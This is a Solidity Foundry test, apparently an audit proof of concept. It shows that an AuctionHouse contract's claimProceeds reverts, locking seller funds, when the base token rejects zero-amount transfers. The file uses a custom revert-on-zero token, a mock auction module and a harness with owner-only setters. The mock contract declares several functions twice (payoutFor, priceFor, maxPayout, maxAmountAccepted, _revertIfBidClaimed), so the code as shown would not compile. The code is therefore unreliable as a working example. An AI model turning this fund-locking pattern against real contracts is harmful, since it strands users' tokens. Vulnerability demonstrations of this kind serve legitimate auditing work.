// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

import "forge-std/Test.sol";
import {AuctionHouse} from "src/AuctionHouse.sol";
import {Auctioneer} from "src/bases/Auctioneer.sol";
import {Keycode, Veecode, toKeycode, wrapVeecode} from "src/modules/Modules.sol";
import {ICallback} from "src/interfaces/ICallback.sol";
import {AuctionModule} from "src/modules/Auction.sol";
import {Module} from "src/modules/Modules.sol";
import {ERC20} from "lib/solmate/src/tokens/ERC20.sol";
import {Transfer} from "src/lib/Transfer.sol";

/*//////////////////////////////////////////////////////////////////////////
                                  Helpers
//////////////////////////////////////////////////////////////////////////*/

/// @notice ERC20 token which REVERTS if a zero‐amount transfer is attempted.
contract RevertOnZeroERC20 is ERC20 {
    error ZeroTransfer();

    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_, 18) {}

    function transfer(address to, uint256 amount) public override returns (bool) {
        if (amount == 0) revert ZeroTransfer();
        return super.transfer(to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (amount == 0) revert ZeroTransfer();
        return super.transferFrom(from, to, amount);
    }

    /// @dev helper mint for tests
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @notice Simple ERC20 that allows zero value transfers (standard behaviour).
contract SimpleERC20 is ERC20 {
    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_, 18) {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/*//////////////////////////////////////////////////////////////////////////
                       Minimal Mock Auction Module
//////////////////////////////////////////////////////////////////////////*/

/// @notice Minimal mock implementing the parts of AuctionModule the AuctionHouse
///         touches during claimProceeds(). Everything else simply reverts.
contract MockAuctionModule is AuctionModule {
    // ---- storage returned by claimProceeds ---- //
    uint96 internal _purchased;
    uint96 internal _sold;
    uint96 internal _payoutSent;

    constructor(address parent_) AuctionModule(parent_) {}

    /* ---------------- PUBLIC CONFIG --------------- */
    function setProceeds(uint96 purchased_, uint96 sold_, uint96 payoutSent_) external {
        _purchased = purchased_;
        _sold = sold_;
        _payoutSent = payoutSent_;
    }

    /* ---------------  AuctionModule --------------- */

    // claimProceeds is the only function that will be invoked in this PoC.
    function claimProceeds(uint96) external override onlyInternal returns (uint96, uint96, uint96) {
        return (_purchased, _sold, _payoutSent);
    }

    /* ---------------  Unused abstract functions – minimal stubs --------------- */

    function _auction(uint96, Lot memory, bytes memory) internal override {}
    function _cancelAuction(uint96) internal override {}

    /* ------------------ Abstract stubs ------------------ */
    // Minimal implementations returning default values so the contract is concrete.
    function _purchase(uint96, uint96, bytes memory) internal pure override returns (uint96, bytes memory) {
        return (0, "");
    }
    function _bid(uint96, address, address, uint96, bytes memory) internal pure override returns (uint64) {
        return 0;
    }
    function _refundBid(uint96, uint64, address) internal pure override returns (uint96) {
        return 0;
    }
    function _claimBids(uint96, uint64[] calldata) internal pure override returns (BidClaim[] memory, bytes memory) {
        return (new BidClaim[](0), "");
    }
    function _claimProceeds(uint96) internal pure override returns (uint96, uint96, uint96) {
        return (0, 0, 0);
    }

    function _revertIfLotSettled(uint96) internal view override {}
    function _revertIfLotNotSettled(uint96) internal view override {}
    function _revertIfLotProceedsClaimed(uint96) internal view override {}
    function _revertIfBidInvalid(uint96, uint64) internal view override {}
    function _revertIfBidClaimed(uint96, uint64) internal view override {}

    // View helpers required by abstract
    function remainingCapacity(uint96) external pure override returns (uint96) { return 0; }
    function capacityInQuote(uint96) external pure override returns (bool) { return false; }
    function isLive(uint96) public pure override returns (bool) { return false; }
    function hasEnded(uint96) public pure override returns (bool) { return true; }
    function payoutFor(uint96, uint96) public pure override returns (uint96) { return 0; }
    function priceFor(uint96, uint96) public pure override returns (uint96) { return 0; }
    function maxPayout(uint96) public pure override returns (uint96) { return 0; }
    function maxAmountAccepted(uint96) public pure override returns (uint96) { return 0; }
    function _revertIfNotBidOwner(uint96, uint64, address) internal view override {}
    function _revertIfBidClaimed(uint96, uint64) internal view override {}

    function _settle(uint96) internal pure override returns (Settlement memory, bytes memory) {
        revert("Not used");
    }

    // Batch-auction functions that are irrelevant for this test – they just revert.
    function bid(uint96, address, address, uint96, bytes calldata) external pure override returns (uint64) {
        revert("Not used");
    }
    function refundBid(uint96, uint64, address) external pure override returns (uint96) {
        revert("Not used");
    }
    function claimBids(uint96, uint64[] calldata) external pure override returns (BidClaim[] memory, bytes memory) {
        revert("Not used");
    }
    function settle(uint96) external pure override returns (Settlement memory, bytes memory) {
        revert("Not used");
    }

    /* ---------------  View helpers --------------- */
    function payoutFor(uint96, uint96) public pure override returns (uint96) { return 0; }
    function priceFor(uint96, uint96) public pure override returns (uint96) { return 0; }
    function maxPayout(uint96) public pure override returns (uint96) { return 0; }
    function maxAmountAccepted(uint96) public pure override returns (uint96) { return 0; }
} // end MockAuctionModule

/*//////////////////////////////////////////////////////////////////////////
                        AuctionHouse test harness
//////////////////////////////////////////////////////////////////////////*/

// -------------------------------------------------------------------------
// End MockAuctionModule definition
// -------------------------------------------------------------------------



/// @notice Simple extension that exposes internal storage setters so the test can
///         craft the exact scenario required to trigger the bug without going
///         through all of AuctionHouse's heavy initialization paths.
contract AuctionHouseHarness is AuctionHouse {
    constructor(address owner_, address protocol_) AuctionHouse(owner_, protocol_, address(0)) {}

    /* ---------------------------- TEST HELPERS --------------------------- */

    // Expose ability to arbitrarily set lotCounter (onlyOwner)
    function setLotCounter(uint96 newCounter) external onlyOwner {
        lotCounter = newCounter;
    }

    // Convenience setter for Routing struct (onlyOwner)
    function setRouting(uint96 lotId, Routing calldata routing) external onlyOwner {
        lotRouting[lotId] = routing;
    }
}

/*//////////////////////////////////////////////////////////////////////////
                                Test Case
//////////////////////////////////////////////////////////////////////////*/

contract ExploitTest is Test {
    AuctionHouseHarness internal house;
    MockAuctionModule internal module;
    RevertOnZeroERC20 internal baseToken; // token that reverts on 0-amount transfers
    SimpleERC20 internal quoteToken;

    address internal seller = address(0xA11CE);
    address internal protocol = address(0xB0B);

    function setUp() public {
        // Deploy contracts
        house = new AuctionHouseHarness(address(this), protocol);
        module = new MockAuctionModule(address(house));

        // Install the mock module into the AuctionHouse (owner is address(this)).
        house.installModule(module);

        // Tokens
        baseToken = new RevertOnZeroERC20("RevertZero", "RZ");
        quoteToken = new SimpleERC20("Quote", "QT");

        // Mint some tokens so balances/allowances look reasonable (not strictly needed for this PoC).
        baseToken.mint(address(house), 1 ether);
        quoteToken.mint(address(house), 1 ether);

        // ---------- Craft vulnerable lot ---------- //
        uint96 lotId = 0;

        // Ensure lotCounter > lotId so _isLotValid passes
        house.setLotCounter(1);

        // Configure routing such that:
        //  - funding == 0 (all prefund already consumed)
        //  - baseToken is our RevertOnZero token
        //  - auctionReference points to our installed mock module
        Auctioneer.Routing memory routing;
        routing.seller = seller;
        routing.funding = 0; // key point -> prefundingRefund will be 0
        routing.baseToken = ERC20(address(baseToken));
        routing.auctionReference = module.VEECODE();
        routing.quoteToken = ERC20(address(quoteToken));
        routing.callbacks = ICallback(address(0)); // no callback contract
        routing.derivativeReference = Veecode.wrap(bytes7(0));
        routing.wrapDerivative = false;
        routing.derivativeParams = "";

        // Store routing in AuctionHouse
        house.setRouting(lotId, routing);

        // Configure module to make purchased = sold = payoutSent = 0 so that
        // prefundingRefund = 0 inside claimProceeds().
        module.setProceeds(0, 0, 0);
    }

    /*//////////////////////////////////////////////////////////////////////////
                              Exploit Demonstration
    //////////////////////////////////////////////////////////////////////////*/

    function test_RevertOnZeroTransfer_LocksFunds() public {
        // Seller tries to claim proceeds. Expect revert because baseToken reverts
        // on 0-amount transfers, but AuctionHouse attempts such a transfer when
        // prefundingRefund == 0.
        vm.prank(seller);
        vm.expectRevert();
        house.claimProceeds(0, "");
    }
}
